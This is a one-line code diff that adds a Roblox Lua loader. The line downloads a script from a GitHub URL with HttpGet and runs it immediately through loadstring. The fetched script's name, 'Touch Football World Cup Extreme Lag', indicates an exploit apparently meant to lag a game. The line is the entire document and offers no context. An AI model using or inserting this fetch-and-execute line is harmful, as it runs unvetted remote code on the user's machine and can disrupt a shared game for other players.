@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xowie89/Roblox-Scripts/main/Touch%20Football%20World%20Cup%20Extreme%20Lag.lua"))()
